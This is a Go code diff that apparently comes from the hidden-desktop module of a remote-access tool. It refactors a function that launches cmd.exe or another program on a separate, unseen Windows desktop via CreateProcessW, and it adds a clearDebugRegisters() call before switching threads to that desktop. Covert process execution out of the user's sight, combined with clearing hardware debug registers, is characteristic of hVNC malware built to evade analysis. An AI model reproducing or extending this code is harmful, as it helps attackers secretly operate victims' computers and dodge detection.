@@ -162,38 +162,40 @@ func hdEnsure() error {
 }
 
 func hdStart(exe string) string {
-	if err := hdEnsure(); err != nil {
-		return "desktop open failed: " + err.Error()
-	}
 	if exe == "" {
 		exe = `C:\Windows\System32\cmd.exe`
 	}
-	desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
-	cmd, err := syscall.UTF16FromString(exe)
-	if err != nil {
-		return "bad command: " + err.Error()
-	}
-	var si syscall.StartupInfo
-	si.Cb = uint32(unsafe.Sizeof(si))
-	si.Desktop = desktop
-	si.Flags = hdStartfUseShowWindow
-	si.ShowWindow = hdSwShow
-	var pi syscall.ProcessInformation
-	ok, _, callErr := procCreateProcessW.Call(
-		0,
-		uintptr(unsafe.Pointer(&cmd[0])),
-		0, 0, 0,
-		hdCreateUnicodeEnv,
-		0, 0,
-		uintptr(unsafe.Pointer(&si)),
-		uintptr(unsafe.Pointer(&pi)),
-	)
-	if ok == 0 {
-		return "spawn failed: " + callErr.Error()
-	}
-	procCloseHandle.Call(uintptr(pi.Process))
-	procCloseHandle.Call(uintptr(pi.Thread))
-	return fmt.Sprintf("desktop started pid=%d", pi.ProcessId)
+	return hdOnDesktop(func() string {
+		desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
+		cmd, err := syscall.UTF16FromString(exe)
+		if err != nil {
+			return "bad command: " + err.Error()
+		}
+		var si syscall.StartupInfo
+		si.Cb = uint32(unsafe.Sizeof(si))
+		si.Desktop = desktop
+		si.Flags = hdStartfUseShowWindow
+		si.ShowWindow = hdSwShow
+		var pi syscall.ProcessInformation
+		ok, _, callErr := procCreateProcessW.Call(
+			0,
+			uintptr(unsafe.Pointer(&cmd[0])),
+			0, 0, 0,
+			0x10,
+			0, 0,
+			uintptr(unsafe.Pointer(&si)),
+			uintptr(unsafe.Pointer(&pi)),
+		)
+		runtime.KeepAlive(cmd)
+		runtime.KeepAlive(desktop)
+		if ok == 0 {
+			return "spawn failed: " + callErr.Error()
+		}
+		pid := pi.ProcessId
+		procCloseHandle.Call(uintptr(pi.Process))
+		procCloseHandle.Call(uintptr(pi.Thread))
+		return fmt.Sprintf("desktop started pid=%d", pid)
+	})
 }
 
 func hdFrame() string {
@@ -304,6 +306,7 @@ func hdOnDesktop(fn func() string) string {
 		}()
 		runtime.LockOSThread()
 		defer runtime.UnlockOSThread()
+		clearDebugRegisters()
 		if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
 			done <- "set desktop failed: " + err.Error()
 			return
